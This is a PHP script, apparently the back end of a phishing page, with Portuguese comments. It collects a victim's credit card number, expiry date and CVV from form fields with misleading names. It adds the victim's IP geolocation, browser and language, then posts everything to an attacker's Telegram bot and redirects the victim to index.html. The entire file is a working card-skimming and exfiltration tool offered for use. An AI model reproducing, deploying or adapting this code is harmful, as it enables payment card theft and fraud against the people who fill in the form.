<?php
ob_start(); // Inicia buffer para evitar erros de header já enviados 4

// Função para obter informações de IP com tratamento de erros
function getIpInfo($ip) {
    $apiUrl  = "http://ip-api.com/json/{$ip}";
    $apiData = @file_get_contents($apiUrl); // Suprime warnings 5
    if ($apiData === false) {
        return ['query'=>$ip,'city'=>'N/A','regionName'=>'N/A','country'=>'N/A','isp'=>'N/A'];
    }
    $data = json_decode($apiData, true); // Decodifica JSON 6
    if (!isset($data['status']) || $data['status'] !== 'success') { // Valida status 7
        return ['query'=>$ip,'city'=>'N/A','regionName'=>'N/A','country'=>'N/A','isp'=>'N/A'];
    }
    return $data;
}

// Função para enviar mensagem ao Telegram via cURL
function sendToTelegram($botToken, $chatId, $message) {
    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
    $postFields = [
        'chat_id' => $chatId,
        'text'    => $message
    ];
    $ch = curl_init($url); // Inicia sessão cURL 8
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields); // Usa POST conforme recomendado 9
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    if ($response === false) {
        error_log("cURL Error: " . curl_error($ch));
    }
    curl_close($ch);
    return $response;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Recupera e sanitiza campos
    $numero    = trim($_POST['campoNome']   ?? '');
    $validade  = trim($_POST['campoTel']    ?? '');
    $cvv       = trim($_POST['campoTel2']   ?? '');
    if ($numero && $validade && $cvv) {
        $ip        = $_SERVER['REMOTE_ADDR'];
        $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'N/A';
        $lang      = $_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? 'N/A';
        
        $info      = getIpInfo($ip);
        $browser   = getBrowserName($userAgent);
        // Monta texto da mensagem
        $txt  = "💳 Número: {$numero}\n";
        $txt .= "📅 Validade: {$validade}\n";
        $txt .= "🔑 CVV: {$cvv}\n";
        $txt .= "🌐 IP: {$info['query']}\n";
        $txt .= "🏙 Cidade: {$info['city']}\n";
        $txt .= "📍 Região: {$info['regionName']}\n";
        $txt .= "🌏 País: {$info['country']}\n";
        $txt .= "📡 ISP: {$info['isp']}\n\n";
        $txt .= "🖥 User-Agent: {$userAgent}\n";
        $txt .= "🌎 Navegador: {$browser}\n";
        $txt .= "🗣 Linguagem: {$lang}\n";
        $txt .= "⏰ Data/Hora: " . date('Y-m-d H:i:s');

        // Lê variáveis de ambiente no Render 10
        $token  = getenv('BOT_TOKEN') ?: '';
        $chatId = getenv('CHAT_ID')   ?: '';
        sendToTelegram($token, $chatId, $txt);

        header('Location: index.html'); // Redireciona após envio 11
        exit;
    }
    echo 'Por favor, preencha todos os campos.';
} else {
    header('Location: index.html');
    exit;
}

// Função de detecção de navegador (mantida)
function getBrowserName($ua) {
    if (stripos($ua, 'Firefox') !== false)   return 'Firefox';
    if (stripos($ua, 'MSIE')    !== false ||
        stripos($ua, 'Trident') !== false)   return 'Internet Explorer';
    if (stripos($ua, 'Edge')    !== false)   return 'Microsoft Edge';
    if (stripos($ua, 'Chrome')  !== false)   return 'Google Chrome';
    if (stripos($ua, 'Safari')  !== false)   return 'Safari';
    if (stripos($ua, 'Opera')   !== false ||
        stripos($ua, 'OPR')     !== false)   return 'Opera';
    return 'Desconhecido';
}
ob_end_flush();